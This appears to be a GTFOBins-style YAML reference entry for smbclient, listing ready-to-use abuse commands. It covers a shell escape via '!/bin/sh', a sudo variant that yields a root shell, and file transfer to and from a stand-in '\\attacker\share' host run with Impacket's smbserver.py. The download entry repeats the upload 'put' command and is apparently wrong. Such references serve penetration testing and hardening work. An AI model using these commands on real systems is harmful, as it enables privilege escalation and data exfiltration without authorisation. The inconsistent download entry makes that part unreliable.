---
description: A valid SMB/CIFS server must be available.
functions:
  shell:
    - code: |
        smbclient '\\attacker\share'
        !/bin/sh
  file-upload:
    - description: Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.
      code: |
        smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
  file-download:
    - description: Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.
      code: |
        smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
  sudo:
    - code: |
        sudo smbclient '\\attacker\share'
        !/bin/sh
---
